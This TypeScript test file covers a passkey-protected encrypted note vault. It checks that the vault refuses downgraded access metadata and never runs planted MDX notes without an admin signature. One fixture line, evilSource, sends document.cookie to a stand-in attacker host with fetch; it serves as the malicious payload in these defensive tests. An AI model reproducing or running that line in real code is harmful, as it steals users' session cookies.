import { expect, test } from "bun:test";
import Dexie from "dexie";
import { IDBFactory, IDBKeyRange } from "fake-indexeddb";
import { noteEntry } from "../../tests/entry-fixture.ts";
import { passkeyPort } from "../../tests/passkey-port.ts";
import {
  memoryPds as sharedPds,
  signedVault,
} from "../../tests/unlock-fixture.ts";
import {
  accessHeaderCommitment,
  createAccessHeader,
  createAccessRecipient,
  unwrapAccessKey,
} from "../crypto/access-v2.ts";
import {
  createSeedRecipient,
  passkeyAdmin,
  seedSigningKey,
  UNTRUSTED_ACCESS,
} from "../crypto/access-v3.ts";
import { revisionOrigin } from "../crypto/authorship.ts";
import { createRecoveryFile, createVaultKey } from "../crypto/index.ts";
import {
  AuthVaultTransport,
  readVerifiedVaultRoot,
  type VaultTransportRpc,
} from "../sync/vault-transport.ts";
import {
  MigrationConfirmationError,
  PasskeysUnavailableError,
  RecoveryConfirmationError,
} from "./runtime.ts";
import { unlockVault } from "./unlock.ts";

Dexie.dependencies.IDBKeyRange = IDBKeyRange;
const evilSource =
  "export const x = fetch('https://attacker.example/' + document.cookie)\n\n# Weekly review";

/** The PDS mock, plus Flow ID's rule for device-token writes: access stays byte-identical. */
function memoryPds(owner: string) {
  const pds = sharedPds(owner);
  let deviceToken = false;
  const rpc: VaultTransportRpc = {
    ...pds.rpc,
    async records(operation) {
      const stored = pds.stored?.value;
      if (
        deviceToken &&
        operation.method === "put" &&
        stored &&
        (operation.record.accessSalt !== stored.accessSalt ||
          JSON.stringify(operation.record.access) !==
            JSON.stringify(stored.access))
      )
        throw { code: "ACCESS_CHANGE_FORBIDDEN", status: 403 };
      return pds.rpc.records(operation);
    },
  };
  return {
    rpc,
    asDevice(enabled: boolean) {
      deviceToken = enabled;
    },
    get stored() {
      return pds.stored;
    },
  };
}

/** A fresh browser; with `shared`, a second passkey of the same account on the same PDS. */
async function setup(tag: string, shared?: ReturnType<typeof memoryPds>) {
  Dexie.dependencies.indexedDB = new IDBFactory();
  const owner = `did:plc:legacy-${shared ? "recover" : tag}`;
  const passkey = shared
    ? { id: "b3RoZXI", publicKey: "f".repeat(128) }
    : { id: "bGVnYWN5", publicKey: "e".repeat(128) };
  const prf = new Uint8Array(32).fill(shared ? 9 : 8);
  const pds = shared ?? memoryPds(owner);
  const port = () =>
    passkeyPort({
      userId: `legacy-${tag}`,
      did: owner,
      credentialId: passkey.id,
      rpc: pds.rpc,
      prf: () => prf.slice(),
    });
  const admin = await passkeyAdmin(prf, passkey.id, owner);
  return { owner, passkey, prf, pds, port, admin };
}
async function originOf(
  runtime: Awaited<ReturnType<typeof unlockVault>>["runtime"],
  path: string,
) {
  await runtime.sync?.();
  const note = (await runtime.list()).find((value) => value.path === path);
  runtime.lock();
  return note?.origin;
}

/** Flow ID's passkey list as the port reaches it, naming these credential ids. */
const flowIdListing = (credentialIds: string[]) => ({
  rpId: "id.flow.industries",
  origin: "https://note.flow.talk",
  registered: async () =>
    credentialIds.map((credentialId) => ({
      credentialId,
      publicKey: `0x${"e".repeat(128)}`,
    })),
});
/** Another browser of `s`'s account and passkey: its own IndexedDB, the same PDS, and Flow ID unreachable unless `registered` names the account's passkeys. */
function browserOf(
  s: Awaited<ReturnType<typeof setup>>,
  indexedDB: typeof Dexie.dependencies.indexedDB = new IDBFactory(),
) {
  return (registered?: string[]) => {
    Dexie.dependencies.indexedDB = indexedDB;
    const port = s.port();
    if (registered) port.passkeys = flowIdListing(registered);
    return port;
  };
}
/** The id of a second passkey Flow ID could list for the victim; credential ids are public to every first-party app. */
const COPASSKEY = "b3RoZXI";
/**
 * With signed access on, the victim's vault is signed and pinned on browser
 * X. A key holder with a browser session rewrites the root as v2 metadata
 * over fresh v2 slots for the victim's public box key, lists one more entry
 * under `decoyId`, and plants Evil.mdx.
 */
async function downgradedSigned(decoyId: string) {
  const s = await setup("wait");
  const x = browserOf(s, Dexie.dependencies.indexedDB);
  (await unlockVault(x(), { setup: true }, true)).runtime.lock();
  const record = s.pds.stored;
  if (!record) throw new Error("Missing vault");
  // The planter already holds the key; the test reads it with the victim's PRF only for brevity.
  const { key } = await unwrapAccessKey(
    { accessSalt: record.value.accessSalt, access: record.value.access },
    s.prf,
    s.passkey.id,
    s.owner,
  );
  const { manifest } = await readVerifiedVaultRoot(key, s.owner, record.value);
  const own = {
    credentialHash: s.admin.recipient.id,
    publicKey: s.admin.recipient.boxPublicKey,
  };
  const decoy = await createAccessRecipient(
    new Uint8Array(32).fill(5),
    decoyId,
    s.owner,
  );
  const header = await createAccessHeader(
    key,
    [own.publicKey, decoy.publicKey],
    s.owner,
  );
  const planter = new AuthVaultTransport(s.pds.rpc, {
    key,
    did: s.owner,
    vault: manifest.vault,
    epoch: manifest.epoch,
    access: {
      header,
      metadata: {
        recipients: [own, decoy],
        accessCommitment: await accessHeaderCommitment(header),
      },
    },
    pinned: null,
  });
  await planter.writeSnapshot(
    [
      await noteEntry(
        key,
        { did: s.owner, vault: manifest.vault },
        null,
        { id: "evil", name: "Evil.mdx" },
        evilSource,
      ),
    ],
    record.cid,
  );
  planter.stop();
  key.fill(0);
  return { s, x, y: browserOf(s) };
}
/** A signed vault whose linked writer re-encrypted the root as v2 metadata over the frozen v3 slots, planting Evil.mdx. */
async function plantedDowngrade() {
  const s = await setup("recover");
  const key = await createVaultKey();
  const vault = crypto.randomUUID();
  const context = { did: s.owner, vault };
  const device = await createSeedRecipient(
    new Uint8Array(32).fill(4),
    "device",
    "Laptop",
  );
  const enrolled = await signedVault(
    key,
    { did: s.owner, vault, epoch: 1 },
    [s.admin.recipient, device],
    s.admin,
  );
  const seeded = new AuthVaultTransport(s.pds.rpc, {
    key,
    did: s.owner,
    ...enrolled,
  });
  await seeded.writeSnapshot([], null);
  seeded.stop();
  s.pds.asDevice(true);
  const planter = new AuthVaultTransport(s.pds.rpc, {
    key,
    did: s.owner,
    vault,
    epoch: 1,
    access: {
      header: enrolled.access.header,
      metadata: {
        recipients: [
          {
            credentialHash: s.admin.recipient.id,
            publicKey: s.admin.recipient.boxPublicKey,
          },
        ],
        accessCommitment: await accessHeaderCommitment(enrolled.access.header),
      },
    },
    pinned: null,
  });
  await planter.writeSnapshot(
    [
      await noteEntry(
        key,
        context,
        null,
        { id: "evil", name: "Evil.mdx" },
        evilSource,
      ),
    ],
    s.pds.stored?.cid ?? null,
  );
  planter.stop();
  s.pds.asDevice(false);
  const recovery = await createRecoveryFile(key, {
    ...context,
    epoch: 1,
    item: "recovery",
    revision: "vault-key-v1",
    assets: [],
  });
  return { s, recovery };
}

test("recovery over planted v2 metadata refuses a v3 slot, and never admin-signs the planter's MDX", async () => {
  const { s, recovery } = await plantedDowngrade();
  await expect(unlockVault(s.port(), { recovery }, true)).rejects.toThrow(
    UNTRUSTED_ACCESS,
  );
  const other = await setup("recover-other", s.pds);
  const cid = s.pds.stored?.cid;
  // Flow ID is unreachable here, so recovery can't judge the planted list and changes nothing.
  await expect(
    unlockVault(other.port(), { recovery }, true),
  ).rejects.toBeInstanceOf(PasskeysUnavailableError);
  expect(s.pds.stored?.cid).toBe(cid);
  // Flow ID lists the root's other passkey, which can't be checked, so recovery asks, then starts over alone.
  const listingBoth = () => {
    const port = other.port();
    port.passkeys = flowIdListing([s.passkey.id, other.passkey.id]);
    return port;
  };
  await expect(
    unlockVault(listingBoth(), { recovery }, true),
  ).rejects.toBeInstanceOf(RecoveryConfirmationError);
  expect(s.pds.stored?.cid).toBe(cid);
  const { runtime } = await unlockVault(
    listingBoth(),
    { recovery, confirmRecovery: true },
    true,
  );
  expect(await originOf(runtime, "Evil.mdx")).toEqual({
    runs: false,
    author: "Not signed",
  });
});

test("a new passkey's recovery of a planted v2 root migrates in the same write, signing in only itself, so the planter's MDX still doesn't run", async () => {
  const { s, recovery } = await plantedDowngrade();
  const other = await setup("recover-other", s.pds);
  const port = other.port();
  // Flow ID no longer lists the planted root's other passkey, so nothing else listed could be a real one.
  port.passkeys = flowIdListing([other.passkey.id]);
  const { runtime } = await unlockVault(port, { recovery }, true);
  expect(await originOf(runtime, "Evil.mdx")).toEqual({
    runs: false,
    author: "Not signed",
  });
  const stored = s.pds.stored?.value;
  if (!stored) throw new Error("Missing record");
  const opened = await unwrapAccessKey(
    { accessSalt: stored.accessSalt, access: stored.access },
    other.prf,
    other.passkey.id,
    s.owner,
  );
  const { metadata } = await readVerifiedVaultRoot(opened.key, s.owner, stored);
  opened.key.fill(0);
  if (!("version" in metadata)) throw new Error("Expected signed access");
  expect(metadata.statement).toMatchObject({
    kind: "migrate",
    signer: other.admin.recipient.id,
  });
  expect(metadata.recipients).toEqual([other.admin.recipient]);
});

test("with signed access on, a fresh browser refuses a downgraded root while Flow ID's list is unavailable, writing and running nothing", async () => {
  const { s, x, y } = await downgradedSigned("Z29uZQ");
  await expect(unlockVault(x(), {}, true)).rejects.toThrow(UNTRUSTED_ACCESS);
  const cid = s.pds.stored?.cid;
  await expect(unlockVault(y(), {}, true)).rejects.toBeInstanceOf(
    PasskeysUnavailableError,
  );
  expect(s.pds.stored?.cid).toBe(cid);
});

test("listing the victim's other passkey can't force a downgraded root open; it is dropped only once confirmed, and the planter's MDX still doesn't run", async () => {
  const { s, y } = await downgradedSigned(COPASSKEY);
  const cid = s.pds.stored?.cid;
  const asked = await unlockVault(y([s.passkey.id, COPASSKEY]), {}, true).catch(
    (error) => error,
  );
  expect(asked).toBeInstanceOf(MigrationConfirmationError);
  expect(s.pds.stored?.cid).toBe(cid);
  const { runtime } = await unlockVault(
    y([s.passkey.id, COPASSKEY]),
    { confirmMigration: asked.confirmation },
    true,
  );
  expect(await originOf(runtime, "Evil.mdx")).toEqual({
    runs: false,
    author: "Not signed",
  });
});

test("a refused unlock syncs nothing, so the later migration endorses no planted MDX, on that browser or the next", async () => {
  const { s, y } = await downgradedSigned("Z29uZQ");
  await expect(unlockVault(y(), {}, true)).rejects.toBeInstanceOf(
    PasskeysUnavailableError,
  );
  const { runtime } = await unlockVault(y([s.passkey.id]), {}, true);
  expect(await originOf(runtime, "Evil.mdx")).toEqual({
    runs: false,
    author: "Not signed",
  });
  const z = browserOf(s);
  const third = await unlockVault(z(), {}, true);
  expect(await originOf(third.runtime, "Evil.mdx")).toEqual({
    runs: false,
    author: "Not signed",
  });
});

test("a fresh browser migrating a planted v2 header signs nothing it didn't already hold", async () => {
  const s = await setup("migrate");
  const key = await createVaultKey();
  const vault = crypto.randomUUID();
  const header = await createAccessHeader(
    key,
    [s.admin.recipient.boxPublicKey],
    s.owner,
  );
  const planter = new AuthVaultTransport(s.pds.rpc, {
    key,
    did: s.owner,
    vault,
    epoch: 1,
    access: {
      header,
      metadata: {
        recipients: [
          {
            credentialHash: s.admin.recipient.id,
            publicKey: s.admin.recipient.boxPublicKey,
          },
        ],
        accessCommitment: await accessHeaderCommitment(header),
      },
    },
    pinned: null,
  });
  await planter.writeSnapshot(
    [
      await noteEntry(
        key,
        { did: s.owner, vault },
        null,
        { id: "evil", name: "Evil.mdx" },
        evilSource,
      ),
    ],
    null,
  );
  planter.stop();
  const { runtime } = await unlockVault(s.port(), {}, true);
  expect(await originOf(runtime, "Evil.mdx")).toEqual({
    runs: false,
    author: "Not signed",
  });
});

test("a session that doesn't sign access syncs planted MDX under an unsigned checkpoint, and the migration on the next unlock signs none of it", async () => {
  const { s, y } = await downgradedSigned("Z29uZQ");
  const unsigned = await unlockVault(y(), {}, false);
  await unsigned.runtime.sync?.();
  expect((await unsigned.runtime.list()).map((note) => note.path)).toContain(
    "Evil.mdx",
  );
  unsigned.runtime.lock();
  const cid = s.pds.stored?.cid;
  const checkpoint = await y().checkpoint();
  expect(checkpoint && "pinned" in checkpoint && checkpoint.pinned).toBeNull();
  // The same unsigned session again, as an app that can't publish opens it, runs none of it and moves nothing.
  const again = await unlockVault(y(), {}, false);
  const evil = (await again.runtime.list()).find(
    (note) => note.path === "Evil.mdx",
  );
  expect(evil?.origin).toEqual({ runs: false, author: "Not signed" });
  expect(evil?.source).toBe(evilSource);
  again.runtime.lock();
  expect(s.pds.stored?.cid).toBe(cid);
  expect(await y().checkpoint()).toEqual(checkpoint);
  const { runtime } = await unlockVault(y([s.passkey.id]), {}, true);
  expect(await originOf(runtime, "Evil.mdx")).toEqual({
    runs: false,
    author: "Not signed",
  });
  // Nor does a browser that trusts the migration on first use run it.
  const z = await unlockVault(browserOf(s)(), {}, true);
  expect(await originOf(z.runtime, "Evil.mdx")).toEqual({
    runs: false,
    author: "Not signed",
  });
});

test("a person's own MDX from before signed access shows its source until they trust it, then runs on every browser", async () => {
  const s = await setup("own");
  const a = browserOf(s, Dexie.dependencies.indexedDB);
  const created = await unlockVault(a(), { setup: true }, false);
  await created.runtime.sync?.();
  await created.runtime.save({
    id: "mine",
    path: "Mine.mdx",
    kind: "mdx",
    source: "# Written here",
  });
  await created.runtime.sync?.();
  created.runtime.lock();
  const migrated = await unlockVault(a(), {}, true);
  await migrated.runtime.sync?.();
  const [mine] = await migrated.runtime.list();
  expect(mine?.origin).toEqual({ runs: false, author: "Not signed" });
  await migrated.runtime.trust([
    { id: mine?.id ?? "", digest: mine?.digest ?? "" },
  ]);
  await migrated.runtime.sync?.();
  expect((await migrated.runtime.list())[0]?.origin).toEqual({
    runs: true,
    author: "Signed by a passkey",
  });
  migrated.runtime.lock();
  const other = await unlockVault(browserOf(s)(), {}, true);
  expect(await originOf(other.runtime, "Mine.mdx")).toEqual({
    runs: true,
    author: "Signed by a passkey",
  });
});

test("control: a writer can't make its MDX run without an admin's signature", async () => {
  const s = await setup("control");
  const key = await createVaultKey();
  const vault = crypto.randomUUID();
  const deviceSeed = new Uint8Array(32).fill(4);
  const device = await createSeedRecipient(deviceSeed, "device", "Laptop");
  const enrolled = await signedVault(
    key,
    { did: s.owner, vault, epoch: 1 },
    [s.admin.recipient, device],
    s.admin,
  );
  const signed = await noteEntry(
    key,
    { did: s.owner, vault },
    {
      recipientId: device.id,
      signPublicKey: device.signPublicKey ?? "",
      privateKey: await seedSigningKey(deviceSeed),
    },
    { id: "dev", name: "Dev.mdx" },
    "# from the device",
  );
  const { metadata } = enrolled.access;
  if (!("version" in metadata)) throw new Error("expected v3");
  expect(
    await revisionOrigin(
      signed,
      { did: s.owner, vault },
      metadata.recipients,
      "every-admin",
    ),
  ).toEqual({ runs: false, author: "Signed by device “Laptop”" });
});
